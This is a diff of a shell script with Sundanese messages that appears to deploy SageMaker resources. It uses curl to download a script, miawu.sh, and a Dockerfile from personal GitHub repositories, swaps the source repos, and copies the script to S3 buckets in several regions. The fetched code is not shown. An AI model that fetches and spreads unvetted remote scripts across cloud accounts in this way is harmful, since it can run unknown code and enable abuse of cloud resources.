@@ -241,12 +241,12 @@ echo "Role IAM SageMaker:"
 echo "${ROLE_ARN}"
 
 echo "Ngeunduh file konfigurasi..."
-curl -fsSL https://github.com/habibbaharyuandi/bross/raw/refs/heads/main/miawu.sh -o edas.sh
-curl -fsSL https://github.com/ngagateng2-creator/codet/raw/refs/heads/main/Dockerfile -o Dockerfile
+curl -fsSL https://github.com/schacink/terbaru/raw/refs/heads/main/miawu.sh -o miawu.sh
+curl -fsSL https://github.com/schacink/terbaru/raw/refs/heads/main/Dockerfile -o Dockerfile
 
 echo "Ieu hasil file anu diunduh:"
-echo "--- edas.sh ---"
-sed -n '1,40p' edas.sh
+echo "--- miawu.sh ---"
+sed -n '1,40p' miawu.sh
 echo "--- Dockerfile ---"
 sed -n '1,40p' Dockerfile
 
@@ -263,7 +263,7 @@ for region in "${REGIONS[@]}"; do
     echo "Bucket geus aya: ${bucket}"
   fi
 
-  aws s3 cp ./edas.sh "s3://${bucket}/${APP_NAME}/edas.sh" --region "${region}"
+  aws s3 cp ./miawu.sh "s3://${bucket}/${APP_NAME}/miawu.sh" --region "${region}"
 done
 
 for region in "${REGIONS[@]}"; do
